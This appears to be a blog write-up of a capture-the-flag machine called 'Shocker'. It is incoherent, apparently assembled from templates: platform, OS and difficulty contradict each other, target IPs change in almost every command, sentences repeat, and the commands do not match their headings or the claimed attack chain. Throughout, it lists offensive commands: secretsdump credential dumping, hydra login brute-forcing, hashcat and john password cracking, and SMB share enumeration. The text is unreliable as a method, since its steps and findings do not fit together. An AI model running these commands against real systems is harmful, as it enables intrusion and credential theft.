---
TitleSEO: "TryHackMe — Shocker (Medium Windows) | ZureFX"
TitlePost: "TryHackMe — Shocker (Medium Windows)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Shocker. Kerberoasting and Command Injection to achieve medium compromise on Windows."
Keywords: "hard, ctf, hackthebox, linux"
URL: "https://zurefx.github.io/writeups/htb-shocker-257.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-shocker-257/"
Date: "2026-03-02"
Tags: "Hard, CTF, HackTheBox, Linux"
Section: "writeups"
Lang: "en"
main_img: "htb-shocker-257"
Permalink: "/writeups/htb-shocker-257.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Shocker** is rated **Medium** on TryHackMe. It runs **Windows** and the IP address during this analysis was `10.16.33.57`.

### Objectives

Network traffic analysis revealed unencrypted communications containing user credentials. Group Policy Preferences contained encrypted but recoverable credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.111.129.244
impacket-secretsdump administrator:'P@ssw0rd!'@10.45.117.92
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Weak file permissions allowed modification of critical system files. The backup files contained sensitive information that should not have been accessible.

### Service Enumeration

Weak file permissions allowed modification of critical system files. The service was running without proper input validation, leading to injection vulnerabilities. The database credentials were hardcoded in the application source code.

```bash
nmap -sCV -p389,9200,8080 10.80.2.247 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.26.22.167/FUZZ
crackmapexec smb 10.55.227.239 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Initial enumeration revealed several interesting open ports on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

### SMB Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. The database credentials were hardcoded in the application source code.

```bash
crackmapexec smb 10.77.84.36 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.34.10.44 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.124.25.128/FUZZ
```

The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism. Network traffic analysis revealed unencrypted communications containing user credentials.

## Exploitation

### Vulnerability Identification

The web application was vulnerable to Server-Side Template Injection (SSTI). The service account had excessive permissions assigned in Active Directory. Authentication bypass was achieved through careful manipulation of the login mechanism.

Key finding: **Kerberoasting**.

Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

### Initial Access

The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.45.249.21 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory. The kernel version was outdated and vulnerable to a publicly known exploit.

## Privilege Escalation

### Enumeration

Initial enumeration revealed several interesting open ports on the target. Initial enumeration revealed several interesting open ports on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.87.177.44/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.88.190.201/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target.

```powershell
feroxbuster -h
nmap -sCV -p587,8443,5986 10.86.7.227 -oN scan.txt
```

Weak file permissions allowed modification of critical system files. The service account had excessive permissions assigned in Active Directory.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The target system was identified as running a vulnerable version of the service. The database credentials were hardcoded in the application source code.

## Summary

### Tools Used

- `metasploit`
- `lookupsid`
- `GetUserSPNs`
- `gobuster`
- `ligolo-ng`
- `hydra`
- `feroxbuster`

### Key Takeaways

- Kerberoasting
- Command Injection
- XXE
- ACL Abuse
